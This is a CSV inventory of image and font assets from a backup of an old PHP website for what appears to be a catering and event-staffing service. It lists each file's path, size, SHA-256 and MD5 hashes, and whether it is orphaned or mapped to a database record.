hero-banner.png,old-website-php/Full-website-backup/frontEnd/images/hero-banner.png,1149325,a5b0d622df7b9da1ea94f2c68bda56f6efcde7e67e6c5b74cb0143f06d230c73,a28c327a3efc37bcc8a5bf08e4a69bc4,Static / Orphaned Disk Asset,,,,
house-party.png,old-website-php/Full-website-backup/frontEnd/images/house-party.png,162427,0279df32e3ec82bda5bf82db3aed33cc2b93d51ba3d318e6d44676818a4aaa80,5a1df916b85372e2c2a4f0e7b74e9cff,Static / Orphaned Disk Asset,,,,
Insta.png,old-website-php/Full-website-backup/frontEnd/images/Insta.png,3087,4e53fbb151ddec487536e275d47e6fa83840666a756909dd52d48013cf039aad,191ea53dcab3ae1c520e7589289b497b,Static / Orphaned Disk Asset,,,,
Linkedin.png,old-website-php/Full-website-backup/frontEnd/images/Linkedin.png,3218,99dc3f3bc30978d25d02fc168aa965b239977dd1caaa72a95b92f310656ff1ef,3a235b8e94c79c20e96a48730c2dfab4,Static / Orphaned Disk Asset,,,,
logo.png,old-website-php/Full-website-backup/frontEnd/images/logo.png,20250,fe7af05f8090a98dea9cee5175e637b6a7400f97da6720f6f611d353eea934db,2d983f2cc7afe28ee5d89f294a175057,Static / Orphaned Disk Asset,,,,
logo2.png,old-website-php/Full-website-backup/frontEnd/images/logo2.png,122801,fd90074148f83d6caadd9c3475372798209d59042ec4fbdd800bd97429d3f292,37ad4e452055532eeb2a1541d73b26ab,Static / Orphaned Disk Asset,,,,
new-year.png,old-website-php/Full-website-backup/frontEnd/images/new-year.png,171352,52a755ff3335cd0d033f3cc2a43720ea6feb3b3226575a334844a1cad41b1d91,38e0cc052e889a6576b3978f7efea8c2,Static / Orphaned Disk Asset,,,,
NoImage.jpg,old-website-php/Full-website-backup/frontEnd/images/NoImage.jpg,15254,27b15a1a43a1e1cad1bf12676fe034b86b6d1812ce9e391b978bc3e5f8807459,d2b532c5da0cfc000dc10b0b2a5d6551,Static / Orphaned Disk Asset,,,,
non_veg_icon.png,old-website-php/Full-website-backup/frontEnd/images/non_veg_icon.png,691,00f4543f3ef086b7e70dfb7f00d301439381b4f36cf6a471b3032892fdf1a2f7,1b58c26873d1440ab4640aa167cc98f5,Static / Orphaned Disk Asset,,,,
partner.png,old-website-php/Full-website-backup/frontEnd/images/partner.png,312920,db6ef670c2b12a4b3b8bacd37f24a776164e9d3dc440b18b484df5276ac69046,c695b240a0be7b83aad8feb238142665,Static / Orphaned Disk Asset,,,,
pdf_icon.png,old-website-php/Full-website-backup/frontEnd/images/pdf_icon.png,2757,3cca1fb3ed880c58e35e1533278c9a770c3c6d2a75d88f0172dba20d32cdddfd,1f938e3819c1a6d5c2702548cbe576ea,Static / Orphaned Disk Asset,,,,
playstore.png,old-website-php/Full-website-backup/frontEnd/images/playstore.png,8219,5d67cd9819dfca2e8e10692f4e25c637379e727600bcc6864bb20d92fcf5eb3f,d48ce6615eaae91c9c61ea74cf60f93f,Static / Orphaned Disk Asset,,,,
pooja.png,old-website-php/Full-website-backup/frontEnd/images/pooja.png,120460,ced84e75c37dee7d6bc6b8c0ed070ff16d55db6248f1e930d5748ac2e1d16a2a,37549dffa71c148cd51ebee10dbbc0e3,Static / Orphaned Disk Asset,,,,
pre-arrow.png,old-website-php/Full-website-backup/frontEnd/images/pre-arrow.png,256,cdd1866518f2e9385180765f0097b93be6a99388b702c266052e4f408d91e6e8,777e782c03edea5f3acd565950fec084,Static / Orphaned Disk Asset,,,,
profile.png,old-website-php/Full-website-backup/frontEnd/images/profile.png,1184,d3d8e5aff65091f1080f040c5e64421bd5af40b6773d831888a6695d95c041a1,695f33d36a8ab215c2c57422079d838f,Static / Orphaned Disk Asset,,,,
quote.png,old-website-php/Full-website-backup/frontEnd/images/quote.png,2494,8b71d5394c3650b03c0855935b1428dfb6ec1e47b8550050cce6b5edcddef89b,18400008de59466db05e056978fe4e33,Static / Orphaned Disk Asset,,,,
star.png,old-website-php/Full-website-backup/frontEnd/images/star.png,1982,888b18b25a3ff0ce6c81e3a088311c3d47cf94ba4480445e60f655af6c58de86,4371a08f4a1bb83b8978b56091887d21,Static / Orphaned Disk Asset,,,,
step1.png,old-website-php/Full-website-backup/frontEnd/images/step1.png,3667,0cf5cd48bb242902a3c25ffb5fbed75378e5f7947e7f3bce3583e4a74d48faa1,a6487efea0c297b7d6738b85030614ea,Static / Orphaned Disk Asset,,,,
step2.png,old-website-php/Full-website-backup/frontEnd/images/step2.png,3142,55e683b4226fc9fb30443acb065efbc48f7a171746b2216f576f130430dd658f,5735a9e5c2dfb03dddf7bf08182d2480,Static / Orphaned Disk Asset,,,,
step3.png,old-website-php/Full-website-backup/frontEnd/images/step3.png,6147,977805ff2e3fa27231e1afae3a4dabfd240b862f173785a9ddbee267cf1cff93,3c49481725cc92376d39e5e1c0837075,Static / Orphaned Disk Asset,,,,
Transparent.png,old-website-php/Full-website-backup/frontEnd/images/Transparent.png,5006,8b41c9088aadc39a5815093c573d4079e52fd2c2ee4a41d9342e52b054bc7c4e,74a74f4002d3a12f6bbedd1729d67f89,Static / Orphaned Disk Asset,,,,
Twitter.png,old-website-php/Full-website-backup/frontEnd/images/Twitter.png,3106,fe4f5d549b1c93f15d4567c8c151b3095835a215088ba7010a7df9bbefd795fb,374aa92435288517ca9c60fca7ebae3a,Static / Orphaned Disk Asset,,,,
user.png,old-website-php/Full-website-backup/frontEnd/images/user.png,3949,8fe6bbd1274a9b8515a7203f51a677ff7d0dfda07e48b35fa1771fc8b7bc1c91,24649d29848400d01846000dc1324319,Static / Orphaned Disk Asset,,,,
veg_icon.png,old-website-php/Full-website-backup/frontEnd/images/veg_icon.png,670,b550a2479b1979179b0ccdaabc7461f46d7260e7efab8e063821f3a3b5f43097,acf28ea0c11d5638d7aa784db830be12,Static / Orphaned Disk Asset,,,,
video1.jpg,old-website-php/Full-website-backup/frontEnd/images/video1.jpg,63880,2a0716c738b2fca5f6e9a863c834b7de583a1fe40844ccdb6fac44c6ebc70332,bc8317d05d4e6149f59c1ddf1eeaca5e,Static / Orphaned Disk Asset,,,,
video2.jpg,old-website-php/Full-website-backup/frontEnd/images/video2.jpg,65660,017f8b47af2ad55cec314b02085c66a3fa1e032ec66224d1fc7606f3d9da5631,7bc2e09f414d8a8658bd4a121e95d5da,Static / Orphaned Disk Asset,,,,
video3.jpg,old-website-php/Full-website-backup/frontEnd/images/video3.jpg,53908,4c2f4b3c1bbdec2a0e89c772d7ff9596f40b92786a029cf54d32fddae6dcefaf,78ab4ea94726ce20405c0be14e902d2f,Static / Orphaned Disk Asset,,,,
waiter.png,old-website-php/Full-website-backup/frontEnd/images/waiter.png,9495,0c1664b3b1022b9e52cfad4811f49fbf5caa01962fe0ae00d3a5e169f286edd8,cc53e39fbf44c33198d8705adbcb2c83,Static / Orphaned Disk Asset,,,,
wedding.png,old-website-php/Full-website-backup/frontEnd/images/wedding.png,1220916,3274b2a15fd091202b6fcd515f037f3dff2d89fd3a9a6a721140f578e5b9f629,89e40c4ae56cdb528e25ac9d260db7e0,Static / Orphaned Disk Asset,,,,
whatsapp.gif,old-website-php/Full-website-backup/frontEnd/images/whatsapp.gif,57275,1b9bca78c95be20c477fc4f96eaca3c9509ad8fe112c6b897f1697152de3cb5e,d716d76b86a86a54614e6daf41a579c8,Static / Orphaned Disk Asset,,,,
food-img.jpg,old-website-php/Full-website-backup/frontEnd/images/fimg/food-img.jpg,7068,1199044efe47db94cf5e1ee8cf8d831291754bf036d4a8be554ac1fdf4eefde2,a36624b43e5d7c4eff828fbef5615bbe,Static / Orphaned Disk Asset,,,,
blog_header.jpg,old-website-php/Full-website-backup/frontEnd/images/hbanner/blog_header.jpg,183329,a177bde4bb4ee8b4c49c5a182cdebb06ce12b9402c2b16548e1e37d55c2dad49,3f3df02f72c9c1429eacedc53adeeca7,Static / Orphaned Disk Asset,,,,
contactus.jpg,old-website-php/Full-website-backup/frontEnd/images/hbanner/contactus.jpg,71200,b3c84cf298e243b16124c4569c49d48865a2fd7947525a11d155595e18236f78,2573905a6098e86ef3ed13c163f19d78,Static / Orphaned Disk Asset,,,,
enquiry_header.jpg,old-website-php/Full-website-backup/frontEnd/images/hbanner/enquiry_header.jpg,168905,7660e806d2d43227b2bdd808ef05ecc97333ca90fcb16ad387363389261bc290,af5363be8a6511a831b1b0d08ed8eb8d,Static / Orphaned Disk Asset,,,,
gallery_header.jpg,old-website-php/Full-website-backup/frontEnd/images/hbanner/gallery_header.jpg,114688,e1c1c0a59c1f9c71b6b0450cff3ae21204f6ab553af3203beae3725dc2bf4f6b,c075729c4c258be0a6aa3df44c4099b1,Static / Orphaned Disk Asset,,,,
hand-banner.png,old-website-php/Full-website-backup/frontEnd/images/hbanner/hand-banner.png,212992,7aadb306c4c4acb16aa753b8e429fffd3ae5fc7a34d99330ec84d1d18fd5136a,c078baebe4e4ed78bd0dc1392963b474,Static / Orphaned Disk Asset,,,,
inquiry_header.jpg,old-website-php/Full-website-backup/frontEnd/images/hbanner/inquiry_header.jpg,173680,3e17e7fe9dc058802d1a7cfbaa539c04a7237a728721e419c6624afbee610324,3d0cdeaa62390624072818d03bdfa488,Static / Orphaned Disk Asset,,,,
our_services.jpg,old-website-php/Full-website-backup/frontEnd/images/hbanner/our_services.jpg,374354,fd16f92bf9479525581a798eafe859611da68ca6ead65d13526323d673cfaab1,ce3730880f1258334a59008b894f0ce2,Static / Orphaned Disk Asset,,,,
partner_header.jpg,old-website-php/Full-website-backup/frontEnd/images/hbanner/partner_header.jpg,148064,021ff7587c46c21882a8e19a3708a3d37d02a5799d2d78960f880e77bc304e56,ece5654e74b441473ebeb4d3dfa21737,Static / Orphaned Disk Asset,,,,
privacypolicy.jpg,old-website-php/Full-website-backup/frontEnd/images/hbanner/privacypolicy.jpg,183969,93651c7d8397e50c59efa7068e5b7746b4502a8b264a8773ac3ec9e1582b9c0e,1b5b7f004b0e1673fc9135c8119d4b90,Static / Orphaned Disk Asset,,,,
termsconditions.jpg,old-website-php/Full-website-backup/frontEnd/images/hbanner/termsconditions.jpg,99967,95b16802b5eb7b0b5da5648a8cf9c4d8951145de7a4be6aae51166b795759670,0ce71029cbad2268e34a73e2c1e0d508,Static / Orphaned Disk Asset,,,,
omprakash.jpeg,old-website-php/Full-website-backup/frontEnd/images/manpower/omprakash.jpeg,60006,3d4744ce31036fb500a259882c37e3e48647394e563a0d76d448c026ab6a095d,eeebdd0ee4dd489adb81dd38a4651857,Static / Orphaned Disk Asset,,,,
pankaj.jpeg,old-website-php/Full-website-backup/frontEnd/images/manpower/pankaj.jpeg,116486,54b14d018e9b9ac353d3ceac50566265ff28f09ab82fb515de59cf5dcb9f726b,d90034f5cb9b6cfa5e058f4d70c4e7ad,Static / Orphaned Disk Asset,,,,
ram_krishan.jpeg,old-website-php/Full-website-backup/frontEnd/images/manpower/ram_krishan.jpeg,17908,6334619f4d33ab1d530cc859b3384e16a9bb5f83b339645f57b7cb46d8fa9e02,6b22b43f74a0c9769140ddcbacc105dc,Static / Orphaned Disk Asset,,,,
shankar.jpeg,old-website-php/Full-website-backup/frontEnd/images/manpower/shankar.jpeg,95907,ff53259a2e1af507c3546d9fe4000e8938ba09a1d7beff271bedf7e0664a279c,6b217ee61b00d1f009312676a55d8976,Static / Orphaned Disk Asset,,,,
subhash.jpeg,old-website-php/Full-website-backup/frontEnd/images/manpower/subhash.jpeg,179188,3510964264d17ef1212b8c011f86879568c0598f36ab0cc68158dbbbbc6c3c4f,26410135257bc3cae673ad0173fb4fe7,Static / Orphaned Disk Asset,,,,
gold.png,old-website-php/Full-website-backup/frontEnd/images/membership/gold.png,46437,53b85a9e4c61d922b914aae5eb1950c969ec35f8e59183ab38bf13d8c73d5130,cf1c946e55fe5bcee492e84eab94220e,Static / Orphaned Disk Asset,,,,
platinum.png,old-website-php/Full-website-backup/frontEnd/images/membership/platinum.png,38874,bb7749c22727ed3e8f4825b4848a5efad32112e503766228452746a2edb3a88a,91991c7c57c1c42e8f3a9bdeca8e595a,Static / Orphaned Disk Asset,,,,
silver.png,old-website-php/Full-website-backup/frontEnd/images/membership/silver.png,41342,593110b07dec09777732a7a407535f3c4295fc80b05602fbaf8dcf81e297c544,24941ee9966e05af278e16366112e450,Static / Orphaned Disk Asset,,,,
facebook.png,old-website-php/Full-website-backup/frontEnd/images/sicon/facebook.png,2818,263b6a91bfbade48df5cc9beb892b5f28b602865d06bbff3601f5b9a5a2e6a4d,bb546797365835db776df67ad8840c89,Static / Orphaned Disk Asset,,,,
instagram.png,old-website-php/Full-website-backup/frontEnd/images/sicon/instagram.png,4191,e1185ba3d92a58c7536e58f5dc97c54ea2d885dc448141bfd66c8e2204e8ea3d,152750a0cfb798f234c307eabbaa2e04,Static / Orphaned Disk Asset,,,,
linkedin.png,old-website-php/Full-website-backup/frontEnd/images/sicon/linkedin.png,2776,727683e782ff489da0cb335a60e100014cddcc59cf48a83db7514783d3db2ccf,86a84dbf62fd8bd3c8f7cbd36f4c445c,Static / Orphaned Disk Asset,,,,
rating3_5.jpg,old-website-php/Full-website-backup/frontEnd/images/sicon/rating3_5.jpg,19203,8d8c9a21a503a42eee0a862f6f0e824d1af41bc2993c46f116f70f6edf397a97,f8594ad67e9234ed4bc1bcfbf5ef0828,Static / Orphaned Disk Asset,,,,
rating_4.jpg,old-website-php/Full-website-backup/frontEnd/images/sicon/rating_4.jpg,19267,7359b890b537315bcba03625a0c513f3f97ee846d8150befb0550723f00d7429,7054cee6fee6d36f4fa50e393f180247,Static / Orphaned Disk Asset,,,,
rating_4_5.jpg,old-website-php/Full-website-backup/frontEnd/images/sicon/rating_4_5.jpg,19738,116af3386994329b74498a47e258fcb8f1bf20cc9e05d9a26e855423552f2f26,1af33994d2539a03fba36ed7b9440a9a,Static / Orphaned Disk Asset,,,,
rating_5.jpg,old-website-php/Full-website-backup/frontEnd/images/sicon/rating_5.jpg,19777,7ffbaf05c695292d29968de81f9d59669cd47b537f310cde15aa464ea399b6cb,0ead2d94591f8c23fdfae0c90f23818d,Static / Orphaned Disk Asset,,,,
twitter.png,old-website-php/Full-website-backup/frontEnd/images/sicon/twitter.png,1205,0c03e22d02f4c9747a52e3de23c40ab73de2ef5add2942e269408e7130941be3,b7518dfaf847209f9fd05b2e4fe40595,Static / Orphaned Disk Asset,,,,
1cook.jpg,old-website-php/Full-website-backup/frontEnd/images/test/1cook.jpg,336221,f3d1ea0847e590bf2aa8adddb2c515369b686d2aad4094eecfda01612c46b050,6461f3b2952d79fa5c02f1bd3dd259f4,Static / Orphaned Disk Asset,,,,
cook.jpg,old-website-php/Full-website-backup/frontEnd/images/test/cook.jpg,433700,7443809e92dd40e1f17e5f6b5bb8e84979abc283ad6db540a16e25d77daefa3f,7365bdef94b740b26b54cddb10bfa023,Static / Orphaned Disk Asset,,,,
about-our-company-1.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/about-our-company-1.jpg,745391,80df17fbe9584e9931eae3c9db5462a34d75c4cf96c0092ed6e327e40ae9818f,7440f01797ad521323e4d38654cfb59b,Static / Orphaned Disk Asset,,,,
cocktail-and-sangeet-.jpeg,old-website-php/Full-website-backup/frontEnd/innderheader/cocktail-and-sangeet-.jpeg,600534,daf7f8cb9bb613de111694aee129aa5e57babcac431e0ebc4c5fdeb9a595b6f4,0546d19981f47ef9aba5d1e7da9a5b2e,Static / Orphaned Disk Asset,,,,
cocktail-and-sangeet-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/cocktail-and-sangeet-.jpg,35402,7f38856105be4b6e0172c435e4d0572c67e6d5470b65ab83c56217c9b780282a,603b06b9aa60c6c963cd741788ee8840,Static / Orphaned Disk Asset,,,,
continental-food-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/continental-food-.jpg,32782,501ee4d5c502f288edce9a9850d0d00520cc37de15e703a63bb13a391913992a,3a1a6b95d60f9c1df32d6b1a80b72dc9,Static / Orphaned Disk Asset,,,,
events-catering-5.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/events-catering-5.jpg,489360,e05e67af7dd36e53333331258a4bdb26233d7b4673385919cfb921152e7e59ac,93f4c9f25c3d2ff5d039afbf2189a06e,DB Mapped (Verified),website_information,5,EVENTS CATERING,innder_header_img
gala-evening-.jpeg,old-website-php/Full-website-backup/frontEnd/innderheader/gala-evening-.jpeg,789406,9f4d1be3877295c4f5c7f239b808cfbf0939e93da412c8823fb819535925b47d,9ca15604f4b3e2d2baf57c5d97ec4dde,Static / Orphaned Disk Asset,,,,
gala-evening-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/gala-evening-.jpg,43014,60ed046d790f32dad7e533373fe49b81cd8ed72adcfe68d3591478cf9c4e1dd6,240c89459b126c578bdc35ba3a38eaaa,Static / Orphaned Disk Asset,,,,
hi-tea-menu-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/hi-tea-menu-.jpg,54397,080eb907be6990efecf2ae82fd47fb9366e1251d5ba3811df3a2a726be290df5,c2a45c123d2270e6df62006650d0fc20,Static / Orphaned Disk Asset,,,,
kids-party-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/kids-party-.jpg,36607,e5431b53ac7740d430063360aaae2c9f46b23d478508567d9b1bd067f6a49f34,3932372dd9cb6118a1aa667a37edeef6,Static / Orphaned Disk Asset,,,,
no-onion-no-garlic-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/no-onion-no-garlic-.jpg,50237,9d5654badc4f491bd3cff10344f0ce862e014907aa7cbb13863fdcea6d04dbc2,0d6581e82c36d63c54f9db0261122d30,Static / Orphaned Disk Asset,,,,
our-partners-8.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/our-partners-8.jpg,148064,021ff7587c46c21882a8e19a3708a3d37d02a5799d2d78960f880e77bc304e56,ece5654e74b441473ebeb4d3dfa21737,Static / Orphaned Disk Asset,,,,
our_services.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/our_services.jpg,374354,fd16f92bf9479525581a798eafe859611da68ca6ead65d13526323d673cfaab1,ce3730880f1258334a59008b894f0ce2,Static / Orphaned Disk Asset,,,,
parties-catering-6.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/parties-catering-6.jpg,489360,e05e67af7dd36e53333331258a4bdb26233d7b4673385919cfb921152e7e59ac,93f4c9f25c3d2ff5d039afbf2189a06e,Static / Orphaned Disk Asset,,,,
privacy-policy-2.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/privacy-policy-2.jpg,183969,93651c7d8397e50c59efa7068e5b7746b4502a8b264a8773ac3ec9e1582b9c0e,1b5b7f004b0e1673fc9135c8119d4b90,Static / Orphaned Disk Asset,,,,
roka-ceremony-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/roka-ceremony-.jpg,394589,72fe88f085ded6c6468c4d542b7f3da56af5ab5956bd13350bc3abd66b5a7c49,534f5cd32855c107902131e8018cf8a6,Static / Orphaned Disk Asset,,,,
royal-lunch-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/royal-lunch-.jpg,109859,0591ab880a7d2a8f7b0e13dc5faca134ea1ed43799795a59ac65200a5f1bfa16,d486977973c763ed1aa6108a0b6d3c08,Static / Orphaned Disk Asset,,,,
terms-of-use-3.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/terms-of-use-3.jpg,99967,95b16802b5eb7b0b5da5648a8cf9c4d8951145de7a4be6aae51166b795759670,0ce71029cbad2268e34a73e2c1e0d508,Static / Orphaned Disk Asset,,,,
wedding-catering-7.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/wedding-catering-7.jpg,486857,0bd9126af22d697b07b958a1236311b510e6fd15bec56402a616048815372db9,f350884233102563b80d516865faccd6,Static / Orphaned Disk Asset,,,,
wedding-functions-.jpg,old-website-php/Full-website-backup/frontEnd/innderheader/wedding-functions-.jpg,56278,47f395f1eb49a72bc3de5b63cb7f6f28bfafdee1e337e8c7e1784e880928cf41,42e731814a15aa8b7c84660b5f6fd4b0,Static / Orphaned Disk Asset,,,,
fontawesome-webfont.svg,old-website-php/Full-website-backup/frontEnd/inner/fonts/fontawesome-webfont.svg,444379,ad6157926c1622ba4e1d03d478f1541368524bfc46f51e42fe0d945f7ef323e4,912ec66d7572ff821749319396470bde,Static / Orphaned Disk Asset,,,,
banner-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-01.jpg,468581,ea0b4eedd06092261d259d1bfd0c1bd05aecee811d9d4690d2df3d1b72d8f2a7,5817ddc14f41d190e238f5a3df974e2f,Static / Orphaned Disk Asset,,,,
banner-01a.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-01a.jpg,199821,c52d8a313ee80991514ecbef01e95d41f6c539d8f80811e17a78c5bd41626a8b,4f72609b5b5ff752617b53ada6cfc9de,Static / Orphaned Disk Asset,,,,
banner-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-02.jpg,337137,f5d1a46bca20679d2527b5b28c02ee57ceee42d13fe59cc57bce8eef1b01e2de,cfbaaae91566fe659da41a24628d3f2b,Static / Orphaned Disk Asset,,,,
banner-02a.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-02a.jpg,246135,275e300d5cd5bd1f1231a1a6b2c1ce7653f58f3227e8584f72765dad0b51591d,88f203f23ea6e26cac9b13bd278ab853,Static / Orphaned Disk Asset,,,,
banner-03a.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/banner-03a.jpg,192982,6a9f5e81d4a4ec0f9e7f08facc0400e3efba51ab22e43528241f91595bb3856f,59727a8276e8bf32c92ed544e4ff1a4d,Static / Orphaned Disk Asset,,,,
logo.png,old-website-php/Full-website-backup/frontEnd/inner/img/logo.png,39255,a8fa85bdde9ef347050e6b81284034cd051ee85413371aafd406125762922280,80be1ee82d051357d1d0ffacb2324d1e,Static / Orphaned Disk Asset,,,,
logo2.png,old-website-php/Full-website-backup/frontEnd/inner/img/logo2.png,122801,fd90074148f83d6caadd9c3475372798209d59042ec4fbdd800bd97429d3f292,37ad4e452055532eeb2a1541d73b26ab,Static / Orphaned Disk Asset,,,,
chafe.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/chef/chafe.jpg,30797,2c397a0f2cd45ed818f733781d8e034f8847f7dc2fa36617f106157153867309,efb39419019f4a69dc1510fc211c2f03,Static / Orphaned Disk Asset,,,,
even-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/event/even-01.jpg,675158,5ab844cf707d6a4e4bc043260cf616bef2a8fd31a277e85291e17d9c441e5119,e2666e4a49390a51db93e0a38d529121,Static / Orphaned Disk Asset,,,,
even-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/event/even-02.jpg,271441,a69e366e124d74a39b8cb325866028b76a65abdc4a61af8145de30c6089c3314,f23addfb6f9edbf4bde377f210571bc0,Static / Orphaned Disk Asset,,,,
even-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/event/even-03.jpg,258003,a98983608f268d02c5abc556f61c20da7974ff85f81e5de2080798833a8e86f7,ecbb437d2d905006992132616a3aab66,Static / Orphaned Disk Asset,,,,
gallery-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/gallery/gallery-01.jpg,63334,8bb60a7c491d2243dbdff18dff33d41a1e4748ef31ea40961aa879581c5e12fc,b6911649019762cc5f4714960b8d9751,Static / Orphaned Disk Asset,,,,
gallery-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/gallery/gallery-02.jpg,195662,a33545577a0a177cecc19bc931fda64098933f8e54ea42447fe29f19de7edcbb,c561ff38d5ea85b579ae9b57b14ab995,Static / Orphaned Disk Asset,,,,
gallery-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/gallery/gallery-03.jpg,120005,3bc93d5536b513f5deb4187b34fbd1f57d217654608684fa640033f3e1a2a7b7,822397d93065b3966ddc0d308fca5d72,Static / Orphaned Disk Asset,,,,
gallery-04.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/gallery/gallery-04.jpg,149551,da0b6cd418dcaba663a07d044f919f9f6ccaf05c2140b791299dade7cea0a40f,1451672ee75d90d8f42c282c51bd0f90,Static / Orphaned Disk Asset,,,,
happy-review-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/happy-review/happy-review-01.jpg,10073,be03df15f2d151aca726b511f040300a10fda71b596ffe4e09e5c5480470e272,14b027de14b0a7dc9e8164032daa1fe9,Static / Orphaned Disk Asset,,,,
happy-review-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/happy-review/happy-review-02.jpg,16087,eb21bae0b89629c82fa677704bb289fad8abaab8940691af1fd47b8d04e60b3e,737c2ba8d7400394c4532a52d88fbf7c,Static / Orphaned Disk Asset,,,,
happy-review-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/happy-review/happy-review-03.jpg,23413,1b1295f866ce5ce4a48aa091dd8f2737ff2a50ef878a2e358156b905ac861dbc,cc1a6d38c2f54dc3031724b59b098e9c,Static / Orphaned Disk Asset,,,,
review-bg.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/happy-review/review-bg.jpg,123873,bfc9680013ba2f342b5f88a704b5eef18509d4b2480f0808c05f3bec557a0ec6,3601524ae70e652849d95b31a92cf56e,Static / Orphaned Disk Asset,,,,
halwai-icon01.png,old-website-php/Full-website-backup/frontEnd/inner/img/icons/halwai-icon01.png,11932,29f9e5d07fee9e22fe2583c59aa1d27d9da4115ddb02b95d66990ad2a1d03116,a78e5f30f9c6aea2edf70634892ba856,Static / Orphaned Disk Asset,,,,
halwai-icon02.png,old-website-php/Full-website-backup/frontEnd/inner/img/icons/halwai-icon02.png,10066,8244f9673e81bf8e728dceb63e1a974bb891e95e8a4613111c0490f2c2efd0b0,1dc5936bac57974fbecec7f608bc1414,Static / Orphaned Disk Asset,,,,
halwai-icon03.png,old-website-php/Full-website-backup/frontEnd/inner/img/icons/halwai-icon03.png,11066,f4004c1758dd9937f8db06d95ed6202d09dc3f59ddd7e4dc936a9f2c8533e999,e5cc634ef420ed713b3fcac81b6aed75,Static / Orphaned Disk Asset,,,,
halwai-icon04.png,old-website-php/Full-website-backup/frontEnd/inner/img/icons/halwai-icon04.png,13952,54f16c5b7e366581b792dbbe78a231a58ce34224b7af4e5cdcd9cd641acad9d5,92e4bb3e460f2566eea1f33bdea9ddd3,Static / Orphaned Disk Asset,,,,
bartenders-for-parties385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/bartenders-for-parties385px.jpg,65285,292ff1a589fd00f252b9e4af5a6c599209cb0ec1d7fd61e8b95e10ca83904553,3d88a64f1291c374089832bbc1b094d8,Static / Orphaned Disk Asset,,,,
cleaners-at-home385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/cleaners-at-home385px.jpg,80834,1049263cbb0fcb46e584f5cd74f46193eb15d929b342900b9015ae4cb05367ac,554bf2b1d1bf3b6e8021e8a6bae105cb,Static / Orphaned Disk Asset,,,,
cooks-&-chefs385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/cooks-&-chefs385px.jpg,66230,54ecc583500cf45ba066ca04d14ffad51b4dc1c53c1bad66f5fe90c6bf85af11,fa90a1335e15e207d3da4cc608534c3f,Static / Orphaned Disk Asset,,,,
crockeryon-rent385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/crockeryon-rent385px.jpg,121595,3c9cba2eae087257f4908a044b7ad09088252fd1c0d41f5085c93a7df2f9e41e,fa084de2f92211f243bfdc1ad3966210,Static / Orphaned Disk Asset,,,,
entertainer385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/entertainer385px.jpg,96016,c4b6e16f71257e46f49fe08e268e3892491e83afdb48307d426bfac01778b250,349b7b2a42101ef4b25a465ee38e7964,Static / Orphaned Disk Asset,,,,
ingredients-delivery-385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/ingredients-delivery-385px.jpg,87975,7d4233f3f82991261843470f881f56b75bded9e01559f387792bcf88338258e1,3d313cf766f69bb062bd271517774f3f,Static / Orphaned Disk Asset,,,,
party-decorator385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/party-decorator385px.jpg,97201,e6c2c939b35fb9b5a8f44ca86c425339555e9a4469aa76512be2d8cede60f5fb,74aa500af9a060752134738e88c1c5a5,Static / Orphaned Disk Asset,,,,
waiters-for-events385px.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/images for tittle/waiters-for-events385px.jpg,65365,b96ddd753b8b47677aaed8b0f8fd2e48888826f8c54a6e0ac668189dba2e6ed2,dc9ed820c2b9345fcfc9f063bc0760cd,Static / Orphaned Disk Asset,,,,
demand-01.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-01.jpg,66230,54ecc583500cf45ba066ca04d14ffad51b4dc1c53c1bad66f5fe90c6bf85af11,fa90a1335e15e207d3da4cc608534c3f,Static / Orphaned Disk Asset,,,,
demand-02.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-02.jpg,65285,292ff1a589fd00f252b9e4af5a6c599209cb0ec1d7fd61e8b95e10ca83904553,3d88a64f1291c374089832bbc1b094d8,Static / Orphaned Disk Asset,,,,
demand-03.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-03.jpg,65365,b96ddd753b8b47677aaed8b0f8fd2e48888826f8c54a6e0ac668189dba2e6ed2,dc9ed820c2b9345fcfc9f063bc0760cd,Static / Orphaned Disk Asset,,,,
demand-04.jpg,old-website-php/Full-website-backup/frontEnd/inner/img/on-demand/demand-04.jpg,87975,7d4233f3f82991261843470f881f56b75bded9e01559f387792bcf88338258e1,3d313cf766f69bb062bd271517774f3f,Static / Orphaned Disk Asset,,,,
